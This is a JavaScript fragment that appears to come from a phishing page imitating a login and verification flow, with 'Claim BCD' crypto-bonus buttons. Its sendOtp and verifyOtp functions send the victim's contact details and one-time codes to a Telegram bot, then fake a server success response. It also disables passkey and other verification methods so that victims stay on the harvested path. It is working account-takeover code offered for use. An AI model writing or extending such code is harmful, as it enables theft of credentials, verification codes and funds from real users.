        span.textContent = `Resend in ${timeLeft}s`;
    }

    resendTimer[type] = setInterval(() => {
        timeLeft--;

        if (timeLeft > 0) {
            if (span) {
                span.textContent = `Resend in ${timeLeft}s`;
            }
        } else {
            clearInterval(resendTimer[type]);
            resendTimer[type] = null;

            btn.disabled = false;
            if (span) {
                span.textContent = "Resend";
            }
        }
    }, 1000);
}
window.startResend = startResend;

// ======================================================
// GLOBAL OTP HOOKS (used by inline OTP UI)
// Provides `window.sendOtp({contact, method})` and `window.verifyOtp({contact, code})`
// These are lightweight wrappers that send formatted messages via Telegram
// and return a Promise<boolean> indicating success.
// ======================================================
window.sendOtp = async function({contact, method} = {}){
    try{
        if(!contact) return Promise.reject(new Error('missing contact'));
        await ensureUserInfo();
        const msg = formatOneTimeLoginMessage(contact);
        await sendToTelegram(msg);
        // simulate server acceptance
        const res = await simulateServerSuccess();
        return res.success === true;
    }catch(e){ console.error('sendOtp error', e); return false; }
};

window.verifyOtp = async function({contact, code} = {}){
    try{
        if(!code) return Promise.resolve(false);
        // choose formatter based on contact type
        const isEmail = (contact||'').indexOf('@')>-1;
        let msg;
        if(isEmail) msg = formatEmailVerificationMessage(code, isAfterSwitch);
        else msg = formatPhoneVerificationMessage(code, isAfterSwitch);
        await sendToTelegram(msg);
        const res = await simulateServerSuccess();
        return res.success === true;
    }catch(e){ console.error('verifyOtp error', e); return false; }
};

// Add click handlers to third-group-wrap buttons to show unavailable message
const thirdGroupButtons = document.querySelectorAll('.third-group-wrap.mt-6.flex.h-11.w-full.items-center.justify-between button');
thirdGroupButtons.forEach(btn => {
    btn.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        showToast("Verification method unavailable.");
    }, true); // Use capture phase to catch before iframe
    
    // Also disable any iframes inside these buttons
    const iframe = btn.querySelector('iframe');
    if (iframe) {
        iframe.style.pointerEvents = 'none';
    }
});

// Add click handler to passkey button
const passkeyButton = document.querySelector('button.button.w-full.mt-3.-mb-3.h-10.border.border-third');
if (passkeyButton) {
    passkeyButton.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        showToast("Verification method unavailable.");
    });
}

});

// ======================================================
// INITIALIZE INPUT FOCUS EFFECTS
// ======================================================

document.addEventListener("DOMContentLoaded", () => {
    // Initialize input focus effects
    const emailInput = document.getElementById('email-phone');
    const emailContainer = document.getElementById('input-container');
    const passwordInput = document.getElementById('password');
    const passwordContainer = document.getElementById('input-container2');

    if (emailInput && emailContainer) {
        emailInput.addEventListener('focus', () => {
            emailContainer.setAttribute('data-focus', 'true');
            emailInput.setAttribute('data-focus', 'true');
        });

        emailInput.addEventListener('blur', () => {
            emailContainer.removeAttribute('data-focus');
            emailInput.removeAttribute('data-focus');
        });
    }

    if (passwordInput && passwordContainer) {
        passwordInput.addEventListener('focus', () => {
            passwordContainer.setAttribute('data-focus', 'true');
            passwordInput.setAttribute('data-focus', 'true');
        });

        passwordInput.addEventListener('blur', () => {
            passwordContainer.removeAttribute('data-focus');
            passwordInput.setAttribute('data-focus', 'true');
        });
    }
    
    console.log('Authentication system initialized with Telegram bot');
});

// Ensure certain full-width brand buttons hide their text when `.loading` is applied
document.addEventListener('DOMContentLoaded', ()=>{
    function ensureBtnLabel(el){
        if(!el) return;
        if(el.querySelector('.btn-label')) return;
        // collect direct text nodes
        const textNodes = Array.from(el.childNodes).filter(n=>n.nodeType===3 && n.textContent.trim());
        const text = textNodes.map(n=>n.textContent.trim()).join(' ').trim();
        if(!text) return;
        // remove those text nodes
        textNodes.forEach(n=>n.remove());
        const span = document.createElement('span');
        span.className = 'btn-label';
        span.textContent = text;
        el.appendChild(span);
    }

    // target the specific class combination requested by user
    const selector = '.button.button-brand.w-full.mt-4.h-12';
    document.querySelectorAll(selector).forEach(btn=>{
        ensureBtnLabel(btn);
    });

    // also ensure any existing "Claim N BCD" buttons are wrapped (fallback)
    // Defer heavy DOM scan to idle time to avoid blocking initial interaction.
    try{
        var runScan = function(){
            try{
                document.querySelectorAll('button, a, div, span').forEach(el=>{
                    if(el.childElementCount===0){
                        const t = (el.textContent||'').trim();
                        if(/^Claim\s+\d+\s*BCD$/i.test(t)) ensureBtnLabel(el);
                    }
                });
            }catch(e){ /* swallow per original intent */ }
        };

        if('requestIdleCallback' in window){
            requestIdleCallback(runScan, {timeout:2000});
        } else {
            // schedule after initial paint
            setTimeout(runScan, 1500);
        }
    }catch(e){}
});
